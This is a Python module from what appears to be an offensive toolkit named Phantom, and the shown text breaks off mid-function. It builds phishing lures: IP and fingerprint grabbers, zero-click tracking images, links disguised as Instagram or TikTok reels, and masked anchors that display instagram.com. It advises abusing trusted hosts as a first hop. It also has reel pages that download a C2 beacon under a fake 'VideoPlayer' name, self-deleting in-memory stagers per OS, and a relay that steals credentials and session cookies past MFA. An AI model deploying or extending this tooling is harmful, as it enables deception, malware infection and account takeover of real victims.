"""craft.py — social-engineering lure crafting (manual core).

One workspace to build the delivery layer of a social engagement:

  craft ipgrab        plain IP-grabber link (click = IP + fingerprint)
  craft reel <term|url>  video-share lure on a REAL video YOU pick: a search
                      term (auto-picks an Instagram/TikTok/YouTube video the
                      target may want) or a full reel/short URL to mirror.
                      The share link strips the author's identifier and the
                      click lands on the IP grabber.
  craft image <file>  ZERO-CLICK image lure: hosts an image YOU choose; the
                      moment it RENDERS (email HTML / page / browser) the IP,
                      device fingerprint and location are captured — no click.
  craft pixel         ico tracker (1x1) — same zero-click capture, invisible
  craft beacon [os]   ONE-CLICK beacon delivery camouflaged as a video link
                      (reel-style URL that silently serves the C2 payload)
  craft beacon-player [os]  upgraded one-click: the reel page plays a REAL
                      video and the play click downloads the beacon under an
                      innocent 'video' name (fail-soft: C2 down = page looks
                      like it won't load, never exposes the C2 URL)
  craft hits <code>   every recorded hit / open / credential (+ device/geo)
  craft wait <code>   live-wait for the target

Everything prints in "ready to paste" form. The tracker is Phantom's own
local HTTP server (no third party), the same one the auto-mode uses.
"""

from __future__ import annotations

import os
import unicodedata
import urllib.parse
import uuid
from typing import Any, Dict, List, Optional

from phantom.automation.social.grabbit import GrabLink, IpGrabber
from phantom.automation.social.tracker import (
    HitStore, VictimHit, OpenEvent, CredCapture,
    public_base_url, env_tracker,
)
from phantom.utils.notifier import notifier


_SINGLETON: Optional[IpGrabber] = None


def _grabber() -> IpGrabber:
    """Module-level singleton: env_tracker() builds a NEW TrackingServer on
    every call, so a fresh grabber per craft would read a different (empty)
    store than the one that received the victim's click. Sharing one
    grabber guarantees craft -> wait/hits see the same store."""
    global _SINGLETON
    if _SINGLETON is None:
        _SINGLETON = IpGrabber()
    return _SINGLETON


def _server() -> Any:
    g = _grabber()
    g._ensure_default_server()
    return g._default_server


def _watch_url(video: Dict[str, str]) -> str:
    """The REAL public page of the mirrored video, used as the FINAL hop:
    after the IP is captured the victim lands on the genuine platform page
    and sees the video — nothing looks broken, nothing looks redirected."""
    v = video or {}
    vid = str(v.get("id") or "")
    src = str(v.get("source") or "youtube").lower()
    url = str(v.get("url") or "")
    if src == "youtube" and vid:
        return f"https://www.youtube.com/watch?v={vid}"
    if src == "instagram":
        return url or (f"https://www.instagram.com/reel/{vid}" if vid else "")
    if src == "tiktok":
        return url or (f"https://www.tiktok.com/video/{vid}" if vid else "")
    return url or (f"https://www.youtube.com/watch?v={vid}" if vid else "")


def _register_final_hop(link: GrabLink, video: Dict[str, str]) -> str:
    """Point this code at the REAL video page: the click route records
    IP/UA, then 302s to the genuine platform URL. Returns the URL (or '').

    This is the closest thing to "nothing happened": the victim clicks a
    shared reel, the video opens on the real platform, and the capture
    already happened during the hop. What it CANNOT do is make the FIRST
    hop show instagram.com — that domain belongs to Instagram, and a
    request to it never reaches this server.
    """
    watch = _watch_url(video)
    if not watch:
        return ""
    try:
        _server().register_redirect(link.code, watch)
    except Exception:
        pass
    return watch


def _tracking_base() -> str:
    try:
        server = _server()
        return public_base_url(server.host, server.port)
    except Exception:
        try:
            s = env_tracker()
            return public_base_url(s.host, s.port)
        except Exception:
            return "http://127.0.0.1:8080"


# ── lures ───────────────────────────────────────────────────────────────────

def craft_ipgrab(label: str = "phish", prefix: str = "") -> Dict[str, Any]:
    """Plain click-tracking link (click = IP + full fingerprint)."""
    link = _grabber().create_link(label=label, prefix=prefix)
    return _link_payload(link, kind="ipgrab")


def craft_reel(arg: str = "", platform: str = "instagram",
               label: str = "reel", handle: str = "") -> Dict[str, Any]:
    """Video-share lure on a REAL video YOU choose.

    `arg` is either a full share URL (instagram.com/reel/..., tiktok.com/@u/
    video/..., youtube.com/shorts/...) to mirror, or a search term that
    auto-picks a real public video the target may want to watch. The share
    link the victim receives strips the author's profile identifier and the
    click lands on the IP grabber (device fingerprint captured).
    """
    try:
        from phantom.automation.social.video_picker import pick_video, sanitize_query
    except Exception:
        pick_video = None
    video: Optional[Dict[str, str]] = None
    arg = (arg or "").strip()
    if not arg:
        return {"error": "Usage: craft reel <instagram|tiktok|youtube URL or search term>"}

    if arg.lower().startswith(("http://", "https://")):
        video = _mirror_url(arg)
        if video is None:
            return {"error": "Could not mirror that video (yt-dlp missing?). "
                             "Pass a search term instead, e.g. craft reel puppy"}
    elif pick_video is not None:
        video = pick_video(interests=[], platform=platform,
                           query=sanitize_query(arg), seed=uuid.uuid4().int % 2**32)
    if not video or not video.get("id"):
        return {"error": f"No real video found for '{arg}'"}

    platform = (video.get("source") or platform or "instagram").lower()
    if platform not in ("tiktok", "youtube"):
        platform = "instagram"
    link = _grabber().create_video_share_link(
        label=label, platform=platform, handle=handle or "", video=video)
    # FINAL HOP: after the IP capture the victim lands on the REAL video
    # page (Instagram/TikTok/YouTube) — the experience is "I opened the
    # shared video and it played".
    final_hop = _register_final_hop(link, video)
    payload = _link_payload(link, kind="reel")
    payload["video"] = video
    payload["video_title"] = (video.get("title") or "")[:90]
    payload["platform"] = platform
    payload["final_hop"] = final_hop
    payload["hint"] = ("click = IP + device fingerprint, then the victim "
                       f"lands on the real video ({final_hop or 'not set'}). "
                       "The FIRST hop cannot display instagram.com: that "
                       "domain is Instagram's — use the masked link text "
                       "where the client renders link text.") if final_hop else ""
    return payload


def _mirror_url(url: str) -> Optional[Dict[str, str]]:
    """Resolve a real share URL (IG/TikTok/YT) into {id, title, channel,
    source} via yt-dlp so the tracker renders THAT video."""
    import shutil
    import subprocess
    ytdlp = shutil.which("yt-dlp")
    if not ytdlp:
        return None
    try:
        out = subprocess.run(
            [ytdlp, "--no-warnings", "--skip-download", "--print",
             "%(id)s|%(title)s|%(channel)s|%(extractor)s", url],
            capture_output=True, text=True, timeout=45)
        if out.returncode != 0 or not out.stdout.strip():
            return None
        vid, title, channel, extractor = (out.stdout.strip().split("\n")[0]
                                          .split("|", 3))
        src = "youtube"
        low = extractor.lower()
        if "instagram" in low:
            src = "instagram"
        elif "tiktok" in low:
            src = "tiktok"
        return {"id": vid.strip(), "title": title.strip(),
                "channel": channel.strip(), "source": src}
    except Exception:
        return None


def craft_image(source: str, label: str = "img") -> Dict[str, Any]:
    """ZERO-CLICK image lure: hosts an image YOU choose on the tracker at
    /i/<code>. Whoever LOADS it (an <img> in an HTML email/page, or opening
    the URL in a browser) is captured — IP, OS, device, browser, location —
    with no interaction. `source` is a local path or an image URL."""
    import urllib.request
    if source.lower().startswith(("http://", "https://")):
        try:
            with urllib.request.urlopen(source, timeout=20) as r:
                data = r.read()
                ctype = r.headers.get("Content-Type", "image/jpeg")
        except Exception as e:
            return {"error": f"Could not fetch image: {e}"}
    else:
        path = os.path.expanduser(source)
        if not os.path.exists(path):
            return {"error": f"Image not found: {source}"}
        with open(path, "rb") as f:
            data = f.read()
        ctype = ("image/png" if path.lower().endswith(".png")
                 else "image/gif" if path.lower().endswith(".gif")
                 else "image/jpeg")
    if not data:
        return {"error": "Empty image"}

    link = _grabber().create_link(label=label, prefix="i/")
    try:
        _server().register_image(link.code, data, ctype)
    except Exception as e:
        return {"error": f"Tracker unavailable: {e}"}
    payload = _link_payload(link, kind="image")
    payload["html"] = (f'<img src="{link.short_url}" alt="" '
                       f'style="max-width:480px" />')
    payload["hint"] = ("Load = IP + device + location captured. Embed the "
                       "URL in an email <img> for zero-click capture.")
    return payload


def craft_video(label: str = "video", platform: str = "instagram",
                handle: str = "", video: Optional[Dict[str, str]] = None
                ) -> Dict[str, Any]:
    """Share-format video lure with a given real video (engine/API use)."""
    link = _grabber().create_video_share_link(
        label=label, platform=platform, handle=handle, video=video)
    return _link_payload(link, kind="video")


def craft_pixel(label: str = "px") -> Dict[str, Any]:
    """Tracking-pixel URL (1x1): IP captured when the image is RENDERED, no
    click required. Drop the URL in an <img src> of an HTML email or a page."""
    link = _grabber().create_link(label=label, prefix="px/")
    payload = _link_payload(link, kind="pixel")
    # NOT display:none: a hidden image is a classic spam marker AND mail
    # providers strip it, which kills the capture on top of hurting delivery.
    payload["html"] = (f'<img src="{link.short_url}" width="1" height="1" '
                       f'style="border:0;outline:none" alt="status" />')
    return payload


# ── the REAL first hop ──────────────────────────────────────────────────────
#
# "The problem is the convincing link." A URL's domain is the address of the
# server that answers it, so we can never make our own host answer as
# instagram.com. What we CAN do is stop putting our host in the first hop.
#
# These hosts are genuinely high-reputation, free, and let YOU control the
# content that sits on them. The DM or email therefore carries a URL that IS
# on the real platform (real domain, real preview card, nothing for a filter
# or a suspicious human to flag), and the capture happens at the SECOND hop:
# a link inside that content — description, bio, pinned comment, a link in a
# document, a Story link sticker.
#
# Cost, stated honestly: one extra tap, and the account/page must exist.
# That is exactly how real campaigns abuse YouTube/Drive/Notion — not by
# faking a domain, which is impossible.

_REAL_FIRST_HOP_HOSTS: Dict[str, str] = {
    "youtube.com": "a video YOU posted: link in the description + pinned "
                   "comment",
    "youtu.be": "a video YOU posted: link in the description",
    "drive.google.com": "a document/PDF/slide YOU own: a link inside it",
    "docs.google.com": "a document YOU own: a link inside it",
    "sites.google.com": "a page YOU publish (free): a link on it",
    "forms.gle": "a form YOU own: a link in the description",
    "notion.site": "a public page YOU publish: a link on it",
    "dropbox.com": "a file YOU share: a link inside it",
    "github.io": "a GitHub Pages site YOU own",
    "medium.com": "an article YOU publish",
    "substack.com": "a post YOU publish",
    "linkedin.com": "a post/article YOU publish",
}


# Of those hosts, which ones let YOU set the VISIBLE text of a link?
#
# This is the missing piece `craft real` shipped without: a raw tracker URL
# in a YouTube description is visible exactly like a raw tracker URL in a DM
# — the extra hop changed nothing for the target. Hiding the destination is
# a RENDERER capability: only a client that displays link TEXT can show one
# thing and open another. There is no HTTP mechanism, header or redirect
# that makes a browser display a URL other than the one it requested.
#
# So the middle hop must be a surface where we control the anchor text.
_ANCHOR_CAPABLE_HOSTS = (
    "sites.google.com",   # Google Sites: link text is editable
    "notion.site",        # Notion page: link label is editable
    "github.io",          # GitHub Pages: full HTML
    "medium.com",         # markdown links
    "substack.com",       # markdown links
    "docs.google.com",    # a labeled link inside a Doc/Slide
    "drive.google.com",   # a shared HTML/PDF with link text
)


def host_supports_anchor(url: str) -> bool:
    """True when a page on this host lets the operator set the visible link
    text, so the destination can differ from what the target reads."""
    try:
        host = (urllib.parse.urlsplit(url or "").hostname or "").lower()
    except Exception:
        return False
    if not host:
        return False
    return any(host == h or host.endswith("." + h)
               for h in _ANCHOR_CAPABLE_HOSTS)


def channel_matrix(url: str = "", code: str = "", display: str = "") -> Dict[str, Any]:
    """Where the destination CAN be hidden, and the exact string to paste.

    The honest table: a link that shows one thing and opens another is only
    possible where the client renders link TEXT. Everywhere else the raw
    domain is what the target reads, and the only remaining lever is WHICH
    domain is shown (a plausible free subdomain, or a neutral shortener) —
    not the destination itself.
    """
    ident = (code or "").split("-", 1)[-1] or (code or "abc123")
    disp = display or f"instagram.com/reel/{ident}"
    u = url or "https://<your-tracker>/reel/" + ident
    rows = [
        ("email_html", True, "HTML email (anchor)",
         f'<a href="{u}">{disp}</a>'),
        ("telegram_html", True, "Telegram (parse_mode=HTML)",
         f'<a href="{u}">{disp}</a>'),
        ("discord_markdown", True, "Discord", f"[{disp}]({u})"),
        ("your_page", True, "a page YOU publish (Sites/Notion/GitHub "
                            "Pages/Docs)", f'<a href="{u}">{disp}</a>'),
        ("whatsapp", False, "WhatsApp", u),
        ("sms", False, "SMS", u),
        ("instagram", False, "Instagram caption / DM", u),
        ("youtube_description", False, "YouTube description", u),
    ]
    channels = {name: {"hides_destination": hides, "where": where,
                       "paste": paste,
                       # the SECOND mechanism works on every channel,
                       # including the ones that render the raw URL
                       "redirect_works": True}
                for name, hides, where, paste in rows}
    return {
        "channels": channels,
        "hideable": [k for k, v in channels.items() if v["hides_destination"]],
        "visible": [k for k, v in channels.items() if not v["hides_destination"]],
        "display": disp,
        "mechanisms": {
            # A: the client renders link TEXT -> reads instagram.com, opens ours
            "anchor": {
                "how": ("an HTML/markdown link whose VISIBLE text is the "
                        "plausible platform URL while the href is the "
                        "tracker"),
                "works_on": [k for k, v in channels.items()
                             if v["hides_destination"]],
                "fails_on": [k for k, v in channels.items()
                             if not v["hides_destination"]],
                "cost": ("none beyond the client support; mail clients show "
                         "the real href on hover/long-press, and a visible "
                         "text that disagrees with the href is itself a "
                         "phishing tell to a trained eye"),
            },
            # B: a real third-party domain in front -> works EVERYWHERE
            "middle_hop_redirect": {
                "how": ("park a real, neutral third-party domain in front "
                        "(a public shortener such as is.gd, or a platform "
                        "that rewrites links like t.co): the target READS "
                        "that domain and it forwards to the tracker"),
                "works_on": "every channel, including WhatsApp, SMS, IG "
                            "caption/DM and YouTube description",
                "paste": f"https://is.gd/<alias>  ->  {u}",
                "cost": ("the hop belongs to a third party that sees the "
                         "destination, can block it and can be shut down; "
                         "and the video preview CARD is lost (it would be "
                         "built from the shortener's own domain)"),
            },
        },
        "truth": ("Hiding the destination has exactly two mechanisms, and "
                  "neither fakes a domain. (A) The client renders link "
                  "TEXT: the target reads instagram.com and opens ours — "
                  "email HTML, Telegram HTML, Discord, a page you publish. "
                  "(B) A real third-party domain sits in front (a "
                  "shortener, or a platform that rewrites links like t.co): "
                  "the target reads a real domain that forwards to ours — "
                  "this works on EVERY channel, at the cost of the preview "
                  "card. After the click the address bar always shows OUR "
                  "domain: no redirect, header or parameter can change "
                  "that, so both mechanisms hide what the target READS, "
                  "never what they see after the click."),
    }


def idn_verdict(domain: str) -> Dict[str, Any]:
    """Will a homograph/IDN domain actually DISPLAY as the brand it imitates?

    Answers with evidence instead of opinion. Browsers apply the IDN display
    policy: a label that **mixes scripts** (Latin + Cyrillic) is shown in its
    punycode form — the opposite of camouflage, and precisely in the case the
    trick exists for. Verified example:

        \u0456nstagram.com  ->  scripts [CYRILLIC, LATIN]  ->  mixed
                            ->  xn--nstagram-shh.com

    It also has to be REGISTERED (free subdomain services only hand out ASCII
    labels under domains you do not own), the certificate will read `xn--…`,
    and mail/chat filters treat homographs as brand impersonation.
    """
    domain = (domain or "").strip().lower().rstrip(".")
    if not domain:
        return {"error": "Usage: craft idn <domain>"}
    def _label_scripts(label: str) -> List[str]:
        found: List[str] = []
        for ch in label:
            if not ch.isalpha():
                continue
            try:
                name = unicodedata.name(ch).split()[0]
            except ValueError:
                name = "UNNAMED"
            if name not in found:
                found.append(name)
        return found

    # The IDN display policy works PER LABEL: a Latin TLD is completely
    # normal, so only a LABEL that mixes scripts is what gets punycoded.
    # Judging the whole domain would wrongly flag every non-Latin domain
    # just because it ends in `.com`.
    mixed_label = ""
    scripts: List[str] = []
    for label in domain.split("."):
        label_scripts = _label_scripts(label)
        for s in label_scripts:
            if s not in scripts:
                scripts.append(s)
        if len(label_scripts) > 1 and not mixed_label:
            mixed_label = label
    mixed = bool(mixed_label)
    ascii_only = all(ord(c) < 128 for c in domain)
    try:
        punycode = domain.encode("idna").decode()
    except Exception:
        punycode = ""
    if ascii_only:
        verdict = ("ASCII domain: displayed exactly as written — nothing is "
                   "hidden, so the only lever left is WHICH domain you "
                   "register (and that costs money).")
        displayed = domain
    elif not punycode:
        verdict = "Invalid IDN domain (it cannot be encoded)."
        displayed = ""
    elif mixed:
        verdict = ("BLOCKED BY THE BROWSER: the label mixes "
                   + " + ".join(scripts)
                   + ". The IDN display policy forces the punycode form, so "
                     "the address bar shows "
                   + punycode + ", NOT the brand. This is the exact case "
                     "the homograph exists for, and it fails here.")
        displayed = punycode
    else:
        # single script -> browsers DO render the Unicode form, but that
        # reads as Cyrillic letters, not as `instagram.com`, so it imitates
        # nothing; and the whole-script-confusable check can still flag it
        verdict = ("Single non-Latin script: browsers DO display the "
                   "Unicode form, but it reads as Cyrillic letters, not as "
                   "`instagram.com` — so it imitates nothing. It also has to "
                   "be registered (no free service hands out an IDN label "
                   "under a domain you do not own).")
        displayed = domain
    return {
        "domain": domain,
        "ascii_only": ascii_only,
        "scripts": scripts,
        "mixed_scripts": mixed,
        "mixed_label": mixed_label,
        "punycode": punycode,
        "displayed_in_address_bar": displayed,
        "verdict": verdict,
        "free_alternative": (
            "An ANCHOR gives the same reading for free: the VISIBLE text of "
            "the link can literally be `instagram.com/reel/abc` (even with "
            "Cyrillic characters, because it is TEXT, not a domain) while "
            "the href is your tracker. No registration, no punycode, no "
            "browser warning. It works wherever the client renders link "
            "text: HTML email, Telegram HTML, Discord, a page you publish."),
    }


def is_real_host(url: str) -> Optional[str]:
    """Return the trust note for a genuine high-reputation host, else None.

    The point is to REFUSE a made-up "instagram.com/reel/..." of our own: if
    the host is not one the operator can actually control content on, the
    first hop is a lie that a single click exposes.
    """
    try:
        host = (urllib.parse.urlsplit(url or "").hostname or "").lower()
    except Exception:
        return None
    if not host:
        return None
    for real_host, note in _REAL_FIRST_HOP_HOSTS.items():
        if host == real_host or host.endswith("." + real_host):
            return note
    return None


def craft_real(outer_url: str = "", inner: str = "ipgrab",
               label: str = "real", text: str = "") -> Dict[str, Any]:
    """Layered lure: a REAL platform link in the message, our link inside it.

    `outer_url` is a URL on a host YOU control content on (see
    `_REAL_FIRST_HOP_HOSTS`, all free). `inner` is the capture layer built
    with the usual crafts: "ipgrab" (click = IP + device), "reel" (reel
    page) or "beacon-player" (reel page + beacon download).

    Returns the ready-to-paste kit: the real outer URL for the DM/email,
    the inner link that goes inside the content, where to place it, and the
    message text. The DM text contains ONLY the real URL — that is the whole
    point: no operator domain ever reaches the target's message.
    """
    outer_url = (outer_url or "").strip()
    if not outer_url.lower().startswith(("http://", "https://")):
        return {"error": "Usage: craft real <https://youtube.com/watch?v=...> "
                         "[ipgrab|reel|beacon-player]"}
    note = is_real_host(outer_url)
    if note is None:
        return {"error": "not_a_real_first_hop: the outer URL must be on a "
                         "host you can actually publish on ("
                         + ", ".join(sorted(_REAL_FIRST_HOP_HOSTS)) + ")",
                "hint": "A URL you invent on instagram.com is answered by "
                        "Instagram, not by the tracker — the capture would "
                        "never happen."}
    kind = (inner or "ipgrab").strip().lower()
    if kind == "beacon-player":
        inner_payload = craft_beacon_player(platform="auto")
    elif kind == "beacon":
        inner_payload = craft_beacon(platform="auto")
    elif kind == "reel":
        inner_payload = craft_reel(arg="", platform="instagram")
    else:
        kind = "ipgrab"
        inner_payload = craft_ipgrab(label=label)
    if "error" in inner_payload:
        return inner_payload
    inner_url = inner_payload.get("url", "")
    host = urllib.parse.urlsplit(outer_url).hostname or ""
    ident = (inner_payload.get("code") or "").split("-", 1)[-1] or "abc123"
    shown = f"instagram.com/reel/{ident}"
    # Can this placement hide the destination? A YouTube description renders
    # the RAW url — exactly the problem `craft real` was meant to solve. So
    # when the outer host cannot carry anchor text, the honest answer is to
    # put an anchor-capable host in the MIDDLE, and the kit says so instead
    # of silently handing back a visible tracker URL.
    anchor_ok = host_supports_anchor(outer_url)
    anchor_html = f'<a href="{inner_url}">{shown}</a>' if anchor_ok else ""
    warning = ""
    if not anchor_ok:
        warning = (
            f"destination_visible_on_{host}: a page on this host renders the "
            "raw URL, so the tracker domain would be visible inside the "
            "content — the same problem as a raw link in the DM. Put an "
            "ANCHOR-CAPABLE host in the middle ("
            + ", ".join(_ANCHOR_CAPABLE_HOSTS)
            + f"), paste the anchor there so the target reads {shown} while "
              "the destination is yours, and link THAT page from the video/"
              "post.")
    dm_text = (text or "Hey {name}, this is the one I was telling you "
                      "about: {outer}").format(name="{name}",
                                               outer=outer_url)
    return {
        "kind": "real_first_hop",
        "outer_url": outer_url,
        "outer_host": host,
        "outer_trust": note,
        "supports_anchor": anchor_ok,
        "inner": kind,
        "inner_url": inner_url,
        "inner_code": inner_payload.get("code", ""),
        "inner_masked": inner_payload.get("masked", {}),
        "inner_payload": inner_payload,
        "inner_anchor_html": anchor_html,
        # what to actually paste inside the content: the masked anchor when
        # the surface allows it, the raw URL when it does not
        "inner_paste": anchor_html or inner_url,
        "inner_display": shown,
        "warning": warning,
        "recommended_middle_hops": list(_ANCHOR_CAPABLE_HOSTS),
        "placement": note,
        "dm_text": dm_text,
        "email_subject": "Found it",
        "email_body": ("Hi,\n\nthis is the one I mentioned: "
                       f"{outer_url}\n\nBest"),
        "created": True,
        "note": ("The first hop is authentic: the target opens a real "
                 f"{host} URL and nothing in the message belongs to the "
                 "operator. "
                 + (f"This placement can also hide the destination: the "
                    f"anchor shows {shown} while the capture runs on YOUR "
                    "tracker." if anchor_ok else
                    "This placement CANNOT hide the destination — read the "
                    "warning and add an anchor-capable middle hop.")
                 + " One extra tap, and the capture runs on YOUR tracker, so "
                   "the IP, the device fingerprint and (for beacon-player) "
                   "the OS-matched download all stay under your control."),
    }


def _link_payload(link: GrabLink, kind: str) -> Dict[str, Any]:
    payload = {
        "kind": kind,
        "code": link.code,
        "url": link.short_url,
        "base": _tracking_base(),
        "created": True,
    }
    payload["masked"] = _masked_variants(link)
    return payload


def _masked_variants(link: GrabLink) -> Dict[str, str]:
    """Ready-to-paste MASKED versions of the lure link: the VISIBLE text
    is a plausible platform share URL while the destination stays the
    tracker. Use the variant matching the channel — a channel that renders
    the raw URL (SMS, plain text) cannot hide the domain, and that is
    stated instead of faked."""
    url = link.short_url
    code = link.code or ""
    ident = code.split("-", 1)[-1] or code
    ig = f"instagram.com/reel/{ident}"
    tt = f"tiktok.com/@user/video/{ident}"
    yt = f"youtu.be/{ident}"
    return {
        "telegram_html": f'<a href="{url}">{ig}</a>   (parse_mode=HTML)',
        "discord_markdown": f"[{ig}]({url})",
        "email_anchor": (f'<a href="{url}">{ig}</a>'),
        "plaintext": url,
        "note": ("masked text works where the client renders link text "
                 "(Telegram/Discord/HTML email); SMS and plain-text "
                 "channels show the real domain"),
        "display_instagram": ig,
        "display_tiktok": tt,
        "display_youtube": yt,
    }


def craft_beacon_player(platform: str = "auto",
                        skin: str = "instagram") -> Dict[str, Any]:
    """Dropper-player beacon delivery: a reel-looking share URL whose page
    plays a REAL video; the play click downloads the compiled beacon under
    an innocent 'video' name and lands the victim on the real video page.
    Fail-soft: if the C2 payload endpoint is unreachable the page simply
    looks like it won't load — no C2 URL is ever exposed.

    This is the upgraded alternative to `craft beacon` (silent 302): one
    click on 'play' instead of a bare redirect, and the victim's
    curiosity is satisfied by the actual video.
    """
    from phantom.core.c2_server import server_instance
    from phantom.utils.network import get_c2_endpoint
    if not (server_instance.thread and server_instance.thread.is_alive()):
        return {"error": "C2 listener not running",
                "hint": "Start it with: c2 > listeners start"}
    host, port = get_c2_endpoint()
    urls = _payload_urls(host, port)
    platform = (platform or "auto").lower()
    auto = platform in ("auto", "")
    # auto: the tracker resolves the visitor's OS from the User-Agent and
    # serves the matching binary; pinned: pass a single URL.
    payload_urls = urls if auto else {platform: urls.get(platform, urls["windows"])}
    payload_url = urls.get(platform, urls["windows"]) if not auto else urls["windows"]
    skin = (skin or "instagram").lower()
    if skin not in ("instagram", "tiktok", "youtube"):
        skin = "instagram"
    try:
        link = _grabber().create_player_link(
            label="player", platform=skin, video=None,
            payload_url="" if auto else payload_url,
            payload_urls=payload_urls)
    except Exception as e:
        return {"error": f"Tracker unavailable: {e}"}
    payload = _link_payload(link, kind="beacon_player")
    payload["payload_url"] = payload_url
    payload["platform"] = "auto" if auto else platform
    payload["skin"] = skin
    payload["droppers"] = _stealth_droppers(host, port)
    payload["hint"] = (
        "One-click delivery: the link looks like a shared reel/short, the "
        "page plays a REAL video, and the play click downloads the beacon "
        "for the VISITOR'S OS (auto-detected from the User-Agent) under a "
        "runnable name matched to that OS (VideoPlayer-<code>.exe on "
        "Windows, VideoPlayer-<code>.apk on Android, no extension on "
        "Linux/macOS where the binary is chmod+run), then opens the real "
        "video. The extension is NEVER faked: a PE saved as .mp4 will not "
        "run after download. If "
        "the C2 is down the page just looks like it won't load (no C2 "
        "exposure). The victim must open the downloaded file (browsers "
        "never auto-run a download — true zero-click execution needs a "
        "browser exploit).")


_PAYLOAD_ENDPOINTS = {
    "windows": "/api/v1/payload",
    "linux": "/api/v1/payload_linux",
    "macos": "/api/v1/payload_macos",
    "android": "/api/v1/payload_android",
}


def _payload_urls(host: str, port: int) -> Dict[str, str]:
    """Per-OS payload URL map: the tracker picks the entry matching the
    visitor's User-Agent, so one lure serves the correct binary for whoever
    opens it (Windows PE / Linux ELF / macOS / Android APK).

    Behind a TLS proxy (Cloudflare tunnel/worker, or any reverse proxy)
    the beacon is reachable on 443 — the port is omitted then so the URL
    stays clean (https://cdn.example/api/v1/payload, never :443)."""
    try:
        p = int(port)
    except (TypeError, ValueError):
        p = 0
    authority = host if p in (0, 443) else f"{host}:{p}"
    return {os_name: f"https://{authority}{path}"
            for os_name, path in _PAYLOAD_ENDPOINTS.items()}


def _stealth_droppers(host: str, port: int) -> Dict[str, str]:
    """No-disk, self-deleting stager per OS: the dropped copy is unlinked
    right after start (Windows runs the beacon fully in-memory via the PIC
    stager). Attached to the delivery payload so the operator gets both the
    camouflaged link AND the ready command for RCE/cmdi/webshell contexts."""
    from phantom.utils.builder import generate_stealth_dropper
    out: Dict[str, str] = {}
    for os_name in ("windows", "linux", "macos", "android"):
        try:
            cmd = generate_stealth_dropper(os_name, host, port,
                                           dl_port=port, use_ssl=True)
            if cmd:
                out[os_name] = cmd
        except Exception:
            continue
    return out


def craft_beacon(platform: str = "auto") -> Dict[str, Any]:
    """ONE-CLICK beacon delivery camouflaged as a video link: the tracker
    hands the victim an Instagram-reel-looking URL that silently redirects
    to the C2 payload endpoint. With the default `platform="auto"` the
    target OS is read from the visitor's User-Agent and the matching binary
    is served — the operator does NOT have to know the OS up front. Pass an
    explicit platform to pin one. No QR — indistinguishable from a shared
    reel at a glance."""
    from phantom.core.c2_server import server_instance
    from phantom.utils.network import get_c2_endpoint
    if not (server_instance.thread and server_instance.thread.is_alive()):
        return {"error": "C2 listener not running",
                "hint": "Start it with: c2 > listeners start"}
    host, port = get_c2_endpoint()
    urls = _payload_urls(host, port)
    auto = (platform or "auto").lower() in ("auto", "")
    target = urls if auto else urls.get(platform.lower(), urls["windows"])
    payload_url = urls["windows"] if auto else target

    base = _tracking_base()
    code = f"beacon-{uuid.uuid4().hex[:8]}"
    reel_url = f"{base}/reel/{code}"
    try:
        _server().register_redirect(code, target)
    except Exception as e:
        return {"error": f"Tracker unavailable: {e}"}
    return {
        "kind": "beacon",
        "code": code,
        "url": reel_url,
        "payload_url": payload_url,
        "platform": "auto" if auto else platform.lower(),
        "droppers": _stealth_droppers(host, port),
        "created": True,
        "hint": ("The link looks like a shared reel. The tracker reads the "
                 "visitor's OS from the User-Agent and serves the matching "
                 "binary (OS auto-detected). The 'droppers' field carries "
                 "the no-disk self-deleting stager per OS (payload copy is "
                 "unlinked right after start; Windows runs in-memory)."),
    }


# ── waiting / results ───────────────────────────────────────────────────────

def craft_aitm(upstream: str = "", code: str = "") -> Dict[str, Any]:
    """Mount an adversarial-in-the-middle relay for a REAL login page.

    Unlike `craft reel`/`craft image` (a lure WE wrote), this serves the
    provider's OWN page fetched live from `upstream` and relays the login
    submission back to it, capturing the credentials AND the session cookies
    the provider issues after the second factor. That is what a clone can
    never have: the page is authentic and the session beats plain MFA.

    OPT-IN and off by default (`phishing.aitm` / `PHANTOM_AITM`), because it
    is credential theft against a live service and it needs a DOMAIN with TLS
    in front — an IP or a free hosting hostname is the technique's ceiling.
    """
    upstream = (upstream or "").strip()
    if not upstream.startswith(("http://", "https://")):
        return {"error": "Usage: craft aitm <https://real-login-url>",
                "hint": ("Pass the provider's live login URL, e.g. "
                         "https://login.microsoftonline.com/")}
    try:
        from phantom.automation.social.aitm import enabled
    except Exception as e:            # pragma: no cover - import guard
        return {"error": f"AiTM unavailable: {e}"}
    if not enabled():
        return {
            "error": "AiTM relay is disabled (opt-in only).",
            "hint": ("Set phishing.aitm=true in data/config.json or export "
                     "PHANTOM_AITM=1, then retry. Requires a DOMAIN with TLS "
                     "in front of the tracker and an authorization to test "
                     "that service."),
            "requires": ["domain+tls", "authorization"],
        }
    try:
        server = _server()
    except Exception as e:
        return {"error": f"Tracker unavailable: {e}"}
    code = code or f"aitm-{uuid.uuid4().hex[:8]}"
    base = _tracking_base()
    mount = f"{base}/a/{code}"
    try:
        server.register_aitm(code, upstream)
    except Exception as e:
        return {"error": f"Could not mount the relay: {e}"}
    return {
        "kind": "aitm",
        "code": code,
        "url": mount,
        "upstream": upstream,
        "created": True,
        "hint": ("Send the mount as the login link. The page is the REAL one; "
                 "what you capture is the credentials AND the session "
                 "cookies (craft hits / craft sessions). Fails against "
                 "FIDO2/passkeys and certificate-pinned clients."),
        "limits": ["fido2-passkeys", "cert-pinned-clients",
                   "device-bound-conditional-access"],
    }


def craft_sessions(code: str) -> Dict[str, Any]:
    """Sessions taken by the AiTM relay for a mount code."""
    store = _store()
    if store is None:
        return {"sessions": []}
    try:
        rows = store.sessions(code)
    except Exception:
        return {"sessions": []}
    return {"sessions": [
        {"ip": s.ip, "username": s.username, "cookies": s.cookies,
         "ua": s.user_agent, "time": s.time} for s in rows]}


def _store() -> Optional[HitStore]:
    try:
        g = _grabber()
        g._ensure_default_server()
        return g._default_store
    except Exception:
        return None


def craft_hits(code: str) -> Dict[str, Any]:
    """Every recorded hit / open / credential for a lure code (instant read)."""
    store = _store()
    if store is None:
        return {"hits": [], "opens": [], "creds": [], "sessions": []}
    try:
        sessions = [_session_dict(s) for s in store.sessions(code)]
    except Exception:
        sessions = []
    return {
        "hits": [_hit_dict(h) for h in store.hits(code)],
        "opens": [_open_dict(o) for o in store.opens(code)],
        "creds": [_cred_dict(c) for c in store.creds(code)],
        "sessions": sessions,
    }


def _hit_dict(h: VictimHit) -> Dict[str, Any]:
    return {"ip": h.ip, "ua": h.user_agent, "time": h.time,
            "os": h.os, "device": h.device, "browser": h.browser,
            "geo": h.geo, "referrer": h.referrer}


def _open_dict(o: OpenEvent) -> Dict[str, Any]:
